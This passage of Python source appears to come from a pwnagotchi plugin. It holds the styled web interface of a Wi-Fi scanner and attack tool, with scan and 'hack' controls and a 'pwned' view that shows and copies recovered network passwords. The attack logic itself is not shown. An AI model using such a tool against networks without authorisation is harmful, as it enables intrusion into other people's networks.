  background: linear-gradient(180deg, #0d1318, #0a0d11);
  border: 1px solid var(--grid);
  padding: 12px;
  clip-path: polygon(0 0, calc(100% - 12px) 0, 100% 12px, 100% 100%, 12px 100%, 0 calc(100% - 12px));
}}
.node::before {{
  content: ''; position: absolute; left: 0; top: 0; bottom: 0;
  width: 3px; background: var(--cyan);
  box-shadow: 0 0 10px rgba(0,229,255,.4);
}}
.node-h {{
  display: flex; align-items: center; justify-content: space-between;
  gap: 10px; margin-bottom: 8px;
}}
.ssid {{
  font-size: 16px; font-weight: 700;
  color: var(--fg); word-break: break-all;
  letter-spacing: .04em;
}}
.sig {{ display: inline-flex; align-items: flex-end; gap: 2px; flex: 0 0 auto; }}
.sig i {{
  display: block; width: 4px; background: #1f2a33;
  border: 1px solid #25313b;
}}
.sig i:nth-child(1) {{ height: 6px; }}
.sig i:nth-child(2) {{ height: 10px; }}
.sig i:nth-child(3) {{ height: 14px; }}
.sig i:nth-child(4) {{ height: 18px; }}
.sig.s1 i:nth-child(-n+1),
.sig.s2 i:nth-child(-n+2),
.sig.s3 i:nth-child(-n+3),
.sig.s4 i:nth-child(-n+4) {{
  background: var(--cyan);
  border-color: var(--cyan);
  box-shadow: 0 0 4px rgba(0,229,255,.6);
}}

.meta {{
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 6px 10px;
  margin: 0 0 12px;
}}
.meta > div {{
  display: flex; flex-direction: column;
  border-left: 1px dashed #1f2a33;
  padding: 2px 0 2px 8px;
}}
.meta dt {{
  font-size: 10px; letter-spacing: .25em;
  color: var(--mute); text-transform: uppercase;
}}
.meta dd {{
  margin: 1px 0 0; font-size: 13px;
  color: var(--fg); word-break: break-all;
}}
.meta code {{ color: var(--cyan); font-size: 12px; }}
.cl.hot {{ color: var(--red); text-shadow: 0 0 8px rgba(255,45,85,.5); }}
.cl.warm {{ color: var(--orange); text-shadow: 0 0 8px rgba(255,122,0,.4); }}
.cl.cold {{ color: var(--mute); }}

/* ---- pwned state ---- */
.node.pwned {{
  background: linear-gradient(180deg, #0c1d12, #07120a);
  border-color: var(--green);
  box-shadow: 0 0 0 1px rgba(43,255,136,.15), 0 0 18px rgba(43,255,136,.08) inset;
}}
.node.pwned::before {{
  background: var(--green);
  box-shadow: 0 0 12px rgba(43,255,136,.6);
}}
.node.pwned .ssid {{ color: var(--green); text-shadow: 0 0 8px rgba(43,255,136,.4); }}
.badge-pwned {{
  display: inline-block;
  margin-left: 8px;
  padding: 2px 8px;
  font-size: 10px; font-weight: 700;
  letter-spacing: .3em;
  background: var(--green);
  color: #002912;
  border: 1px solid var(--green);
  vertical-align: middle;
  clip-path: polygon(4px 0, 100% 0, calc(100% - 4px) 100%, 0 100%);
  text-shadow: none;
}}
.pw {{
  grid-column: 1 / -1;
  border-left: 2px solid var(--green) !important;
  background: rgba(43,255,136,.05);
  padding: 6px 0 6px 8px !important;
}}
.pw dt {{ color: var(--green) !important; }}
.pw dd {{
  display: flex; align-items: center; gap: 8px;
  flex-wrap: wrap;
}}
.pw .pw-val {{
  color: var(--green) !important;
  font-size: 14px !important;
  font-weight: 700;
  letter-spacing: .04em;
  word-break: break-all;
  text-shadow: 0 0 6px rgba(43,255,136,.4);
}}
.pw .copy {{
  appearance: none; -webkit-appearance: none;
  background: transparent;
  border: 1px solid var(--green);
  color: var(--green);
  font: inherit; font-size: 10px;
  letter-spacing: .25em;
  text-transform: uppercase;
  padding: 4px 8px;
  cursor: pointer;
}}
.pw .copy:active {{ transform: translateY(1px); }}
.pw .copy.ok {{ background: var(--green); color: #002912; }}

.node.pwned .btn-hack {{
  background: linear-gradient(180deg, #052618, #021a0e);
  color: var(--green);
  border-color: var(--green);
  text-shadow: 0 0 6px rgba(43,255,136,.4);
  box-shadow: inset 0 0 24px rgba(43,255,136,.06);
}}

/* ---- hack button ---- */
.btn-hack {{
  appearance: none; -webkit-appearance: none;
  width: 100%;
  height: 48px;
  padding: 0 14px;
  font: inherit; font-weight: 700;
  letter-spacing: .25em; text-transform: uppercase;
  background: linear-gradient(180deg, #2a1300, #1a0a00);
  color: var(--orange);
  border: 1px solid var(--orange);
  cursor: pointer;
  display: flex; align-items: center; justify-content: center; gap: 10px;
  clip-path: polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px);
  text-shadow: 0 0 6px rgba(255,122,0,.6);
  box-shadow: inset 0 0 24px rgba(255,122,0,.08);
}}
.btn-hack:active {{ transform: translateY(1px); }}
.btn-hack[disabled] {{
  opacity: .35; cursor: not-allowed; filter: grayscale(.6);
}}
.btn-hack .glyph {{ font-size: 18px; }}

/* ---- empty + log ---- */
.empty {{
  text-align: center; padding: 40px 12px;
  border: 1px dashed var(--grid); color: var(--mute);
}}
.empty-glyph {{ font-size: 42px; color: var(--cyan); opacity: .6; }}
.empty p {{ margin: 8px 0 4px; letter-spacing: .25em; color: var(--fg); }}
.empty small {{ letter-spacing: .15em; }}

.section-h {{
  margin: 18px 0 8px;
  font-size: 11px; letter-spacing: .3em;
  color: var(--mute); text-transform: uppercase;
  display: flex; align-items: center; gap: 8px;
}}
.section-h::before, .section-h::after {{
  content: ''; flex: 1; height: 1px; background: var(--grid);
}}
.log {{
  margin: 0;
  background: #04070a;
  color: #b5e6ee;
  border: 1px solid var(--grid);
  padding: 10px 12px;
  font-size: 12px; line-height: 1.5;
  max-height: 240px; overflow: auto;
  white-space: pre-wrap; word-break: break-all;
}}
.log:empty::before {{ content: '// silence'; color: var(--mute); }}

footer.tag {{
  margin: 16px 0 8px;
  text-align: center;
  color: var(--mute);
  font-size: 10px; letter-spacing: .35em;
}}

/* ---- larger phones / small tablets ---- */
@media (min-width: 560px) {{
  body {{ font-size: 15px; }}
  .meta {{ grid-template-columns: repeat(4, 1fr); }}
  .status {{ grid-template-columns: repeat(4, 1fr); }}
}}

/* ---- glitch on the brand title ---- */
.brand h1 {{
  position: relative;
}}
.brand h1::after {{
  content: attr(data-text);
  position: absolute; left: 0; top: 0;
  color: var(--cyan); opacity: .35;
  transform: translate(1px, -1px);
  pointer-events: none;
  mix-blend-mode: screen;
}}
</style>
</head>
<body>
<div class='wrap'>

  <div class='brand'>
    <div class='mark'>&#x2620;</div>
    <h1 data-text='ctOS // wd_scanner'>ct<b>OS</b> // wd_scanner</h1>
    <span class='sub'>DedSec</span>
  </div>

  <div class='status'>
    <div class='chip'><span class='k'>aux iface</span><span class='v'>{iface}</span></div>
    <div class='chip'><span class='k'>monitor</span><span class='v'>{mon}</span></div>
    <div class='chip {scan_cls}'><span class='k'>scan</span><span class='v'>{scan_state}</span></div>
    <div class='chip {atk_cls}'><span class='k'>attack</span><span class='v'>{attack_state}</span></div>
  </div>

  <div class='picker'>
    <form method='POST' action='/plugins/wd_scanner/select'>
      <select name='interface' aria-label='auxiliary radio' {pick_disabled}>
        {options}
      </select>
      <button type='submit' class='btn' {pick_disabled}>&#9711; SELECT</button>
    </form>
    <form method='POST' action='/plugins/wd_scanner/release' style='flex:0 0 auto'>
      <button type='submit' class='btn alt' {release_disabled}>&#10005; RELEASE</button>
    </form>
  </div>
  {select_err}
  {select_hint}

  <div class='toolbar'>
    <form method='POST' action='/plugins/wd_scanner/scan'>
      <input type='number' name='seconds' value='{secs}' min='5' max='300' inputmode='numeric' aria-label='scan seconds'>
      <button type='submit' class='btn' {scan_disabled}>&#9678; SCAN</button>
    </form>
  </div>

  <div class='section-h'>nodes detected</div>
  <div class='grid'>
    {cards}
  </div>

  <div class='section-h'>action log</div>
  <pre class='log'>{log}</pre>

  <footer class='tag'>// the truth will set us free //</footer>
</div>
<script>
(function () {{
  document.addEventListener('click', function (ev) {{
    var t = ev.target;
    if (!t || !t.classList || !t.classList.contains('copy')) return;
    var pw = t.getAttribute('data-pw') || '';
    var done = function () {{
      var orig = t.textContent;
      t.classList.add('ok'); t.textContent = 'copied';
      setTimeout(function () {{ t.classList.remove('ok'); t.textContent = orig; }}, 1200);
    }};
    if (navigator.clipboard && navigator.clipboard.writeText) {{
      navigator.clipboard.writeText(pw).then(done, function () {{}});
    }} else {{
      var ta = document.createElement('textarea');
      ta.value = pw; document.body.appendChild(ta); ta.select();
      try {{ document.execCommand('copy'); done(); }} catch (e) {{}}
      document.body.removeChild(ta);
    }}
  }});
}})();
</script>
</body></html>
""".format(
            iface=escape(self._iface_cfg or "—"),
            mon=escape(self._mon_iface or "—"),
            scan_state=scan_state,
            attack_state=attack_state,
            scan_cls="run" if self._scan_running else "",
            atk_cls="busy" if self._action_running else "",
            secs=self._scan_seconds,
            scan_disabled="disabled" if (self._scan_running or not has_iface) else "",
            options="\n".join(opt_lines),
            pick_disabled="disabled" if (self._scan_running or self._action_running) else "",
            release_disabled="disabled" if (
                not has_iface or self._scan_running or self._action_running
            ) else "",
            select_err=select_err_html,
            select_hint=(
                "" if has_iface
                else "<div class='hint'>// pick an auxiliary radio above to begin //</div>"
            ),
            cards="\n".join(cards) if cards else empty_state,
            log=action_log,
        )
        return body


def pwnagotchi_config_main_iface():
    """Look up the primary monitor interface pwnagotchi is told to use."""
    try:
        import pwnagotchi
        cfg = getattr(pwnagotchi, "config", None) or {}
        return ((cfg.get("main") or {}).get("iface")
                or (cfg.get("main") or {}).get("interface"))
    except Exception:
        return None
